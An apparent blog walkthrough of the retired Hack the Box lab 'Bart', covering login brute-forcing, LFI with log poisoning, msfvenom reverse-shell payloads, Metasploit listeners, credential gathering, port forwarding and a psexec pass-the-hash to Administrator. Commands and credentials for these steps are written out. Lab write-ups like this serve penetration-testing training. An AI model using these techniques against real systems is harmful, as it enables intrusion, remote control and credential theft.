@@ -1,0 +1,451 @@
+
+								
+																		Hack the Box: Bart Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 3, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Bart” which is available online for those who want to increase their skill in penetration testing and black box testing. Bart is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Expert
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.81 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.81
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.81
+					
+				
+			
+		
+
+From the given below image, you can observe we find only port 80 is open on the target system.
+
+As port 80 is running http, we open the IP address in our browser. As soon as we open the IP address we get redirected to “forum.bart.htb”.
+
+Since htb doesn’t have global DNS, we aren’t going to be able to resolve the site. So we add a DNS entry in our /etc/hosts file to point 10.10.10.81 to both bart.htb and forum.bart.htb.
+
+When we open forum.bart.htb, we find a website that has been built on WordPress.
+
+When we open bart.htb it redirects us to forum.bart.htb. We enumerate directories for both domains and find a directory called “/monitor” for domain bart.htb.
+
+		
+		
+			
+			
+			
+			
+dirb http://bart.htb/
+			
+				
+					
+				
+					1
+				
+						dirb http://bart.htb/
+					
+				
+			
+		
+
+
+When we open /monitor directory given by dirb scan and find a login page
+
+We use burpsuite to brute force the login page using an /usr/share/wordlists/metasploit/common-root.txt dictionary and find the credentials to be harvery:potter.
+
+We login using these credentials and get redirected to a different domain called monitor.bart.htb.
+
+We add the domain name monitor.bart.htb in /etc/hosts file.
+
+Now when we refresh the page we get a page for server monitoring.
+
+Going through the page we find a link to a site and a domain we need to add to /etc/hosts.
+
+We add domain internal-01.bart.htb we found earlier on the site to /etc/hosts.
+
+We now open internal-01.bart.htb and find a login form.
+
+We capture the login request using burpsuite and modify the request by changing login.php to register.php.
+
+Then we login using the credentials we use to register and find a chat box.
+
+We find a link to an open log link, we capture the request using burpsuite and when we look at the header it looks like filename parameter may be vulnerable to LFI.
+
+We were not able to access any system file but we were able to access log.php and find access logs.
+
+Now we use log poisoning to get a reverse shell. We change the user-agent to run the whoami command, when we run the command we get the user name.
+
+We were not able to get reverse shell using web delivery, so we first create a reverse shell using msfvenom
+
+		
+		
+			
+			
+			
+			
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f exe &gt; shell.exe
+			
+				
+					
+				
+					1
+				
+						msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f exe &gt; shell.exe
+					
+				
+			
+		
+
+
+After creating our shell, we upload the payload to the target machine using PowerShell. First we set up our HTTP server using python.
+
+		
+		
+			
+			
+			
+			
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					1
+				
+						python -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+
+
+We set up our listener using Metasploit before executing the target machine.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/multi/handler
+msf &gt; exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf &gt; exploit(multi/handler) &gt; set lhost 10.10.14.6
+msf &gt; exploit(multi/handler) &gt; set lport 4444
+msf &gt; exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/multi/handlermsf &gt; exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf &gt; exploit(multi/handler) &gt; set lhost 10.10.14.6msf &gt; exploit(multi/handler) &gt; set lport 4444msf &gt; exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+ 
+After uploading our shell and setting up our listener, we now execute the payload using log poisoning.
+
+As soon as we execute the payload we get our reverse shell.
+
+After we get the reverse shell we find that the system is 64-bit architecture so we change the payload type to 64-bit architecture.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use windows/local/payload_inject
+msf exploit(windows/local/payload_inject) &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/local/payload_inject) &gt; set lhost 10.10.14.6
+msf exploit(windows/local/payload_inject) &gt; set lport 1234
+msf exploit(windows/local/payload_inject) &gt; set session 1
+msf exploit(windows/local/payload_inject) &gt; run
+			
+				
+					
+				
+					123456
+				
+						msf &gt; use windows/local/payload_injectmsf exploit(windows/local/payload_inject) &gt; set payload windows/x64/meterpreter/reverse_tcpmsf exploit(windows/local/payload_inject) &gt; set lhost 10.10.14.6msf exploit(windows/local/payload_inject) &gt; set lport 1234msf exploit(windows/local/payload_inject) &gt; set session 1msf exploit(windows/local/payload_inject) &gt; run
+					
+				
+			
+		
+
+
+After running the exploit, we get a 64-bit meterpreter shell. Now we can run post modules properly as 32-bit meterpreter was running into problems.
+
+We use autologin post module to find the password for Administrator user.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use windows/gather/credentials/windows_autologin
+msf post(windows/gather/credentials/windows_autologin) &gt; set session 2
+msf post(windows/gather/credentials/windows_autologin) &gt; run
+			
+				
+					
+				
+					123
+				
+						msf &gt; use windows/gather/credentials/windows_autologinmsf post(windows/gather/credentials/windows_autologin) &gt; set session 2msf post(windows/gather/credentials/windows_autologin) &gt; run
+					
+				
+			
+		
+
+
+Now enumerating the target machine, we find that port 445 is running internally. So we use port forwarding so that we can use our machine to connect with it.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; portfwd add -l 443 -p 445 -r 10.10.10.81
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; portfwd add -l 443 -p 445 -r 10.10.10.81
+					
+				
+			
+		
+
+
+Now we use impacket-smbserver to create an smb server in our machine. So that we can share our /root directory with the target machine as our shell that we created earlier can be run on the target machine.
+
+		
+		
+			
+			
+			
+			
+impacket-smbserver hack /root
+			
+				
+					
+				
+					1
+				
+						impacket-smbserver hack /root
+					
+				
+			
+		
+
+
+Now the session we had earlier died so port 4444 is free. So we are going to use that payload to get our reverse shell. First, we run Metasploit in a new tab and set up our listener.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use multi/handler
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 10.10.14.6
+msf exploit(multi/handler) &gt; set lport 4444
+msf exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 10.10.14.6msf exploit(multi/handler) &gt; set lport 4444msf exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+
+Now we use psexec auxiliary to run our payload hosted on our system.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use auxiliary/admin/smb/psexec_command
+msf auxiliary(admin/smb/psexec_command) &gt; set SMBUser Administrator
+msf auxiliary(admin/smb/psexec_command) &gt; set SMBPass 3130438f31186fbaf962f407711faddb
+msf auxiliary(admin/smb/psexec_command) &gt; set COMMAND \\\\10.10.14.6\\\hack\\\shell.exe
+msf auxiliary(admin/smb/psexec_command) &gt; set rhosts 127.0.0.1
+msf auxiliary(admin/smb/psexec_command) &gt; set rport 443
+msf auxiliary(admin/smb/psexec_command) &gt; run
+			
+				
+					
+				
+					1234567
+				
+						msf &gt; use auxiliary/admin/smb/psexec_commandmsf auxiliary(admin/smb/psexec_command) &gt; set SMBUser Administratormsf auxiliary(admin/smb/psexec_command) &gt; set SMBPass 3130438f31186fbaf962f407711faddbmsf auxiliary(admin/smb/psexec_command) &gt; set COMMAND \\\\10.10.14.6\\\hack\\\shell.exemsf auxiliary(admin/smb/psexec_command) &gt; set rhosts 127.0.0.1msf auxiliary(admin/smb/psexec_command) &gt; set rport 443msf auxiliary(admin/smb/psexec_command) &gt; run
+					
+				
+			
+		
+
+ 
+As soon as we run psexec auxiliary we get a reverse shell with as an administrator.
+
+In c:\Users\Administrator\Desktop we find a file called root.txt when we open it and find our first flag.
+
+Enumerating the system in c:\Users\h.potter, we find a file called user.txt. When we take a look at the content of the file we get our second flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Skyw3lker August 4, 2018 at 2:11 pm							
+							
+							
+														
+							
+								Could you be MORE explicit specially in the privesc part .  i couldn’t follow along
+you are great but always be as explicit as you can, if you may
+Thanks for the great effort, I’m a big fan
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								slfkjsdkj September 21, 2018 at 12:41 pm							
+							
+							
+														
+							
+								Isn’t importing wordlists in Intruder in Burpsuite possible only in the paid version? According to your screenshots of Burpsuite you are using the Community (free) edition…
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Raj Chandel September 22, 2018 at 7:41 am							
+							
+							
+														
+							
+								Burpsuite Community edition also allows user to load wordlists. It is possible that there might be a bug that isn’t allowing it to load wordlists. Try reinstalling Burpsuite it might fix the problem.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
